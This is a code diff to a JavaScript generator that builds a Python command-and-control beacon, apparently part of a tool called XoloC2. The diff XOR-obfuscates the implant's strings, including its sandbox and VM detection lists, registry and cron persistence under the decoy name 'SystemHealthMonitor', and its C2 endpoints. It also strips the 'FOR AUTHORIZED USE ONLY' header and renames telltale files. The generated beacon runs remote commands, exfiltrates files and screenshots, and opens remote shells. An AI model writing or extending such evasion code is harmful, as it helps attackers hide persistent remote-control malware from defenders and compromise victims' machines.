@@ -2470,6 +2470,8 @@ function generateBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {
     .map(b => String.fromCharCode(97 + b % 26)).join('');
   const eUrls = urls.map(u => xorEnc(u, xk));
   const es = xorEnc(secret, xk);
+  // xPy: encrypts a string at generation time → emits _x("hex", _k) in Python source
+  const xPy = s => `_x("${xorEnc(s, xk)}", _k)`;
 
   // ── Evasion code blocks ───────────────────────────────────────────────────
   const uaBlock = ev.traffic ? `
@@ -2510,15 +2512,15 @@ def _check_env():
                         break
     except: pass
     _u = (os.getenv('USER') or os.getenv('USERNAME') or '').lower()
-    if any(x in _u for x in ['sandbox','malware','virus','sample','honey','cuckoo','analyst']):
+    if any(x in _u for x in [${xPy('sandbox')},${xPy('malware')},${xPy('virus')},${xPy('sample')},${xPy('honey')},${xPy('cuckoo')},${xPy('analyst')}]):
         sys.exit(0)
     _h = socket.gethostname().lower()
-    if any(x in _h for x in ['sandbox','malware','virus','analysis','cuckoo','vbox','vmware']):
+    if any(x in _h for x in [${xPy('sandbox')},${xPy('malware')},${xPy('virus')},${xPy('analysis')},${xPy('cuckoo')},${xPy('vbox')},${xPy('vmware')}]):
         sys.exit(0)
     if _WIN:
         try:
             _r = subprocess.run("tasklist /FO CSV /NH", shell=True, capture_output=True, text=True, timeout=5)
-            _bad = ['vboxservice','vmtoolsd','vmsrvc','vboxtray','sandboxiedcomlaunch','wireshark','procmon','fiddler']
+            _bad = [${xPy('vboxservice')},${xPy('vmtoolsd')},${xPy('vmsrvc')},${xPy('vboxtray')},${xPy('sandboxiedcomlaunch')},${xPy('wireshark')},${xPy('procmon')},${xPy('fiddler')}]
             for _p in _r.stdout.lower().split(','):
                 if any(_b in _p for _b in _bad): sys.exit(0)
         except: pass
@@ -2609,25 +2611,20 @@ if _dtm.date.today() >= _KILL:
 
   const postHeaders = ev.traffic
     ? `            hdrs = {"Content-Type": "application/json",
-                    "X-Agent-Secret": SECRET,
+                    ${xPy('X-Agent-Secret')}: SECRET,
                     "User-Agent": random.choice(_UA_POOL),
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                     "Accept-Language": "en-US,en;q=0.5",
                     "Accept-Encoding": "gzip, deflate",
                     "Referer": random.choice(_REFERERS)}`
     : `            hdrs = {"Content-Type": "application/json",
-                    "X-Agent-Secret": SECRET}`;
+                    ${xPy('X-Agent-Secret')}: SECRET}`;
 
   const respParse = ev.encrypt
     ? `_json.loads(_dec_resp(resp.read()))`
     : `_json.loads(resp.read())`;
 
   return `#!/usr/bin/env python3
-"""
-XoloC2 Beacon
-Generated: ${new Date().toISOString()}
-FOR AUTHORIZED USE ONLY
-"""
 import uuid, platform, socket, os, subprocess, time, random, sys, threading as _th, base64 as _b64
 
 try:
@@ -2651,7 +2648,7 @@ SECRET  = _x("${es}", _k)
 _url_idx = 0
 
 _BASE    = os.path.dirname(os.path.abspath(__file__))
-_ID_FILE = os.path.join(_BASE, ".beacon_id")
+_ID_FILE = os.path.join(_BASE, ${xPy('.hid')})
 
 def _get_or_create_id():
     if os.path.exists(_ID_FILE):
@@ -2664,7 +2661,7 @@ def _get_or_create_id():
 
 AGENT_ID = _get_or_create_id()
 
-_CWD_FILE = os.path.join(_BASE, ".beacon_cwd")
+_CWD_FILE = os.path.join(_BASE, ${xPy('.cwd')})
 
 def _load_cwd():
     if os.path.exists(_CWD_FILE):
@@ -2689,17 +2686,17 @@ def _persist():
         if _WIN:
             import winreg
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
+                ${xPy('Software\\Microsoft\\Windows\\CurrentVersion\\Run')},
                 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, "SystemHealthMonitor", 0, winreg.REG_SZ,
+            winreg.SetValueEx(key, ${xPy('SystemHealthMonitor')}, 0, winreg.REG_SZ,
                 f'"{sys.executable}" "{src}"')
             winreg.CloseKey(key)
         else:
             import subprocess as _sp
-            entry = f"@reboot {sys.executable} {src} &"
-            existing = _sp.run("crontab -l", shell=True, capture_output=True, text=True).stdout
+            entry = ${xPy('@reboot ')} + sys.executable + " " + src + " &"
+            existing = _sp.run(${xPy('crontab -l')}, shell=True, capture_output=True, text=True).stdout
             if entry not in existing:
-                _sp.run(f'(crontab -l 2>/dev/null; echo "{entry}") | crontab -', shell=True)
+                _sp.run("(" + ${xPy('crontab -l 2>/dev/null')} + '; echo "' + entry + '") | crontab -', shell=True)
     except Exception:
         pass
 _persist()
@@ -2728,7 +2725,7 @@ def _get_bytes(path):
     for i in range(len(C2_URLS)):
         url = C2_URLS[(_url_idx + i) % len(C2_URLS)]
         try:
-            r = _req.Request(url + path, headers={"X-Agent-Secret": SECRET}, method="GET")
+            r = _req.Request(url + path, headers={${xPy('X-Agent-Secret')}: SECRET}, method="GET")
             with _req.urlopen(r, context=SSL_CTX, timeout=30) as resp:
                 return resp.read()
         except Exception:
@@ -2791,8 +2788,8 @@ def run_command(cmd, task_id=None):
                         return "screenshot requires scrot: apt install scrot"
             with open(tmp, "rb") as f:
                 b64 = base64.b64encode(f.read()).decode()
-            fname = f"screenshot_{int(_t.time())}.png"
-            return f"__b64file__:{fname}:{b64}"
+            fname = f"img_{int(_t.time())}.png"
+            return ${xPy('__b64file__:')} + fname + ":" + b64
         except Exception as e:
             return f"Error: {e}"
         finally:
@@ -2845,15 +2842,15 @@ def run_command(cmd, task_id=None):
         try:
             with open(path, "rb") as f: data = f.read()
             b64 = base64.b64encode(data).decode()
-            return f"__b64file__:{os.path.basename(path)}:{b64}"
+            return ${xPy('__b64file__:')} + os.path.basename(path) + ":" + b64
         except Exception as e:
             return f"Error reading {path}: {e}"
 
-    if cmd.startswith("__upload__:") and task_id:
+    if cmd.startswith(${xPy('__upload__:')}) and task_id:
         _, filename, dest = cmd.split(":", 2)
         if dest.endswith("/") or dest.endswith("\\\\") or os.path.isdir(dest):
             dest = os.path.join(dest.rstrip("/\\\\"), filename)
-        data = _get_bytes(f"/api/beacon/fetch/{AGENT_ID}/{task_id}")
+        data = _get_bytes(${xPy('/api/beacon/fetch/')} + f"{AGENT_ID}/{task_id}")
         if data is None:
             return f"Error: could not fetch {filename}"
         try:
@@ -2862,7 +2859,7 @@ def run_command(cmd, task_id=None):
         except Exception as e:
             return f"Error writing {dest}: {e}"
 
-    if cmd.startswith('__pty__:'):
+    if cmd.startswith(${xPy('__pty__:')}):
         _sid = cmd[8:]
         def _pty_run(sid=_sid):
             if _WIN:
@@ -3027,7 +3024,7 @@ def _tunnel_tick():
                 except: pass
 
 def checkin():
-    return _post("/api/beacon/checkin", {
+    return _post(${xPy('/api/beacon/checkin')}, {
         "agent_id":       AGENT_ID,
         "hostname":       socket.gethostname(),
         "ip_internal":    _local_ip(),
@@ -3046,7 +3043,7 @@ def main():
             if resp and resp.get("task_id"):
                 out = run_command(resp["command"], resp["task_id"])
                 if out != '__pty_started__':
-                    _post("/api/beacon/result", {"task_id": resp["task_id"],
+                    _post(${xPy('/api/beacon/result')}, {"task_id": resp["task_id"],
                                                  "output": out, "status": "done"})
         except Exception:
             pass
